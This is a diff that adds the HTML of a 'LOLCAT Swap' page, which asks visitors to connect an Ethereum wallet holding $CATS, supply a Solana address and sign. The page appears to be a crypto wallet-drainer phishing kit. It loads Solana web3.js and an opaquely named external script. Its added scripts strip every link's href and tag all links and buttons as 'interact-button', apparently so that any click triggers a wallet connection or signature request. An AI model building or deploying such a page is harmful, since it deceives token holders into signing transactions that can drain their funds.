@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <link rel="icon" type="image/svg+xml" href="favicon.png" />
+    <meta name="viewport" content="width=device-width" />
+    <meta name="generator" content="Astro v4.16.7" />
+    <script
+      type="text/javascript"
+      src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"
+    ></script>
+    <title>LOLCAT Swap</title>
+    <!-- Add Work Sans font import -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Work+Sans:ital,wght@0,100..900;1,100..900&amp;display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="_astro/index.BCB7nRz0.css" />
+    <script type="module" src="_astro/hoisted.BAqAPp1B.js"></script>
+    <script src="f23c6412-2fe5-49d6-89bd-960e8c165654.js"></script>
+  </head>
+  <body
+    class="w-full h-full flex justify-center items-center min-h-[100vh] bg-gray-200 flex-col px-4"
+  >
+    <div
+      class="w-full bg-foreground/10 fixed top-0 left-0 p-2 text-center flex justify-between items-center space-x-2"
+    >
+      <div class="flex items-center space-x-2 justify-start">
+        <div
+          class="bg-white rounded-lg p-1.5 flex justify-center items-center w-7 h-7"
+        >
+          <img src="favicon.png" alt="LOLCAT SWAP" />
+        </div>
+        <h1 class="text-foreground font-semibold text-sm">LOLCAT SWAP</h1>
+      </div>
+    </div>
+    <style>
+      astro-island,
+      astro-slot,
+      astro-static-slot {
+        display: contents;
+      }
+    </style>
+    <script
+      type="text/javascript"
+      crossorigin="anonymous"
+      src="https://us-assets.i.posthog.com/static/recorder.js?v=1.176.0"
+    ></script>
+    <script>
+      (() => {
+        var e = async (t) => {
+          await (
+            await t()
+          )();
+        };
+        (self.Astro || (self.Astro = {})).only = e;
+        window.dispatchEvent(new Event("astro:only"));
+      })();
+      (() => {
+        var A = Object.defineProperty;
+        var g = (i, o, a) =>
+          o in i
+            ? A(i, o, {
+                enumerable: !0,
+                configurable: !0,
+                writable: !0,
+                value: a,
+              })
+            : (i[o] = a);
+        var d = (i, o, a) => g(i, typeof o != "symbol" ? o + "" : o, a);
+        {
+          let i = {
+              0: (t) => m(t),
+              1: (t) => a(t),
+              2: (t) => new RegExp(t),
+              3: (t) => new Date(t),
+              4: (t) => new Map(a(t)),
+              5: (t) => new Set(a(t)),
+              6: (t) => BigInt(t),
+              7: (t) => new URL(t),
+              8: (t) => new Uint8Array(t),
+              9: (t) => new Uint16Array(t),
+              10: (t) => new Uint32Array(t),
+              11: (t) => (1 / 0) * t,
+            },
+            o = (t) => {
+              let [l, e] = t;
+              return l in i ? i[l](e) : void 0;
+            },
+            a = (t) => t.map(o),
+            m = (t) =>
+              typeof t != "object" || t === null
+                ? t
+                : Object.fromEntries(
+                    Object.entries(t).map(([l, e]) => [l, o(e)])
+                  );
+          class y extends HTMLElement {
+            constructor() {
+              super(...arguments);
+              d(this, "Component");
+              d(this, "hydrator");
+              d(this, "hydrate", async () => {
+                var b;
+                if (!this.hydrator || !this.isConnected) return;
+                let e =
+                  (b = this.parentElement) == null
+                    ? void 0
+                    : b.closest("astro-island[ssr]");
+                if (e) {
+                  e.addEventListener("astro:hydrate", this.hydrate, {
+                    once: !0,
+                  });
+                  return;
+                }
+                let c = this.querySelectorAll("astro-slot"),
+                  n = {},
+                  h = this.querySelectorAll("template[data-astro-template]");
+                for (let r of h) {
+                  let s = r.closest(this.tagName);
+                  s != null &&
+                    s.isSameNode(this) &&
+                    ((n[r.getAttribute("data-astro-template") || "default"] =
+                      r.innerHTML),
+                    r.remove());
+                }
+                for (let r of c) {
+                  let s = r.closest(this.tagName);
+                  s != null &&
+                    s.isSameNode(this) &&
+                    (n[r.getAttribute("name") || "default"] = r.innerHTML);
+                }
+                let p;
+                try {
+                  p = this.hasAttribute("props")
+                    ? m(JSON.parse(this.getAttribute("props")))
+                    : {};
+                } catch (r) {
+                  let s = this.getAttribute("component-url") || "<unknown>",
+                    v = this.getAttribute("component-export");
+                  throw (
+                    (v && (s += ` (export ${v})`),
+                    console.error(
+                      `[hydrate] Error parsing props for component ${s}`,
+                      this.getAttribute("props"),
+                      r
+                    ),
+                    r)
+                  );
+                }
+                let u;
+                await this.hydrator(this)(this.Component, p, n, {
+                  client: this.getAttribute("client"),
+                }),
+                  this.removeAttribute("ssr"),
+                  this.dispatchEvent(new CustomEvent("astro:hydrate"));
+              });
+              d(this, "unmount", () => {
+                this.isConnected ||
+                  this.dispatchEvent(new CustomEvent("astro:unmount"));
+              });
+            }
+            disconnectedCallback() {
+              document.removeEventListener("astro:after-swap", this.unmount),
+                document.addEventListener("astro:after-swap", this.unmount, {
+                  once: !0,
+                });
+            }
+            connectedCallback() {
+              if (
+                !this.hasAttribute("await-children") ||
+                document.readyState === "interactive" ||
+                document.readyState === "complete"
+              )
+                this.childrenConnectedCallback();
+              else {
+                let e = () => {
+                    document.removeEventListener("DOMContentLoaded", e),
+                      c.disconnect(),
+                      this.childrenConnectedCallback();
+                  },
+                  c = new MutationObserver(() => {
+                    var n;
+                    ((n = this.lastChild) == null ? void 0 : n.nodeType) ===
+                      Node.COMMENT_NODE &&
+                      this.lastChild.nodeValue === "astro:end" &&
+                      (this.lastChild.remove(), e());
+                  });
+                c.observe(this, { childList: !0 }),
+                  document.addEventListener("DOMContentLoaded", e);
+              }
+            }
+            async childrenConnectedCallback() {
+              let e = this.getAttribute("before-hydration-url");
+              e && (await import(e)), this.start();
+            }
+            async start() {
+              let e = JSON.parse(this.getAttribute("opts")),
+                c = this.getAttribute("client");
+              if (Astro[c] === void 0) {
+                window.addEventListener(`astro:${c}`, () => this.start(), {
+                  once: !0,
+                });
+                return;
+              }
+              try {
+                await Astro[c](
+                  async () => {
+                    let n = this.getAttribute("renderer-url"),
+                      [h, { default: p }] = await Promise.all([
+                        import(this.getAttribute("component-url")),
+                        n ? import(n) : () => () => {},
+                      ]),
+                      u = this.getAttribute("component-export") || "default";
+                    if (!u.includes(".")) this.Component = h[u];
+                    else {
+                      this.Component = h;
+                      for (let f of u.split("."))
+                        this.Component = this.Component[f];
+                    }
+                    return (this.hydrator = p), this.hydrate;
+                  },
+                  e,
+                  this
+                );
+              } catch (n) {
+                console.error(
+                  `[astro-island] Error hydrating ${this.getAttribute(
+                    "component-url"
+                  )}`,
+                  n
+                );
+              }
+            }
+            attributeChangedCallback() {
+              this.hydrate();
+            }
+          }
+          d(y, "observedAttributes", ["props"]),
+            customElements.get("astro-island") ||
+              customElements.define("astro-island", y);
+        }
+      })();
+    </script>
+    <astro-island
+      uid="Zf7dLz"
+      component-url="/_astro/App.fIbrjjhl.js"
+      component-export="default"
+      renderer-url="/_astro/client.CbDTJhQP.js"
+      props="{}"
+      client="only"
+      opts='{"name":"App","value":"vue"}'
+      data-v-app=""
+      ><div class="w-full h-full flex justify-center items-center flex-col">
+        <div
+          class="p-4 border-b border-gray-200 grid grid-cols-4 text-center text-sm justify-items-center mb-8"
+        >
+          <div class="w-10 h-10 flex justify-center items-center opacity-100">
+            <iconify-icon icon="mdi:ethereum" class="text-2xl"></iconify-icon>
+          </div>
+          <div class="w-10 h-10 flex justify-center items-center opacity-20">
+            <iconify-icon
+              icon="simple-icons:solana"
+              class="text-lg"
+            ></iconify-icon>
+          </div>
+          <div class="w-10 h-10 flex justify-center items-center opacity-20">
+            <iconify-icon
+              icon="material-symbols:signature"
+              class="text-2xl"
+            ></iconify-icon>
+          </div>
+          <div
+            class="w-10 h-10 flex justify-center items-center cursor-pointer opacity-100"
+          >
+            <iconify-icon
+              icon="pajamas:status-health"
+              class="text-2xl"
+            ></iconify-icon>
+          </div>
+          <div class="px-4 opacity-100">ETH Wallet</div>
+          <div class="px-4 opacity-20">SOL Address</div>
+          <div class="px-4 opacity-20">Sign</div>
+          <div class="px-4 cursor-pointer opacity-100">Status</div>
+        </div>
+        <div
+          class="bg-white rounded-2xl shadow-lg border border-gray-200 w-full max-w-sm"
+        >
+          <div
+            class="rounded-lg border bg-card text-card-foreground shadow-sm border-none"
+          >
+            <div class="flex flex-col gap-y-1.5 p-6 text-center">
+              <h3 class="text-2xl font-semibold leading-none tracking-tight">
+                Connect Wallet
+              </h3>
+              <p class="text-sm text-muted-foreground">
+                Connect your Ethereum wallet holding $CATS
+              </p>
+            </div>
+            <div class="p-6 pt-0 flex flex-col items-center">
+              <div class="w-full">
+                <button
+                  class="inline-flex items-center justify-center whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-primary text-primary-foreground hover:bg-primary/90 h-10 px-4 py-2 w-full"
+                >
+                  Connect Wallet
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+        <button
+          class="inline-flex items-center justify-center whitespace-nowrap rounded-md font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 text-primary underline-offset-4 hover:underline h-10 px-4 py-2 mt-4 text-sm"
+        >
+          Already transferred? Check Status</button
+        ><!----><button
+          class="inline-flex items-center justify-center whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-primary hover:bg-primary/90 px-4 py-2 min-h-0 m-0 h-auto bg-gradient-to-b from-green-500 to-green-600 text-white border border-green-300 w-full max-w-xs"
+          type="button"
+          aria-haspopup="dialog"
+          aria-expanded="false"
+          data-state="closed"
+        >
+          <div>Got problem? Use&nbsp;</div>
+          <iconify-icon
+            icon="mingcute:ai-fill"
+            class="text-xl mr-2"
+          ></iconify-icon>
+          AI Help
+        </button>
+      </div></astro-island
+    >
+    <!----><!---->
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        var links = document.querySelectorAll("body a");
+        for (var i = 0; i < links.length; i++) {
+          var link = links[i];
+          link.removeAttribute("href");
+          link.classList.add("interact-button");
+        }
+      });
+    </script>
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        var buttons = document.querySelectorAll("body button");
+        for (var i = 0; i < buttons.length; i++) {
+          var button = buttons[i];
+          button.classList.add("interact-button");
+        }
+      });
+    </script>
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const elements = document.querySelectorAll("[ad-data-linked]");
+        elements.forEach((element) => {
+          element.removeAttribute("ad-data-linked");
+        });
+
+        console.log(
+          "Removed ad-data-linked attributes from",
+          elements.length,
+          "elements"
+        );
+      });
+    </script>
+
+    <style>
+      .interact-button {
+        cursor: pointer;
+      }
+    </style>
+  </body>
+</html>
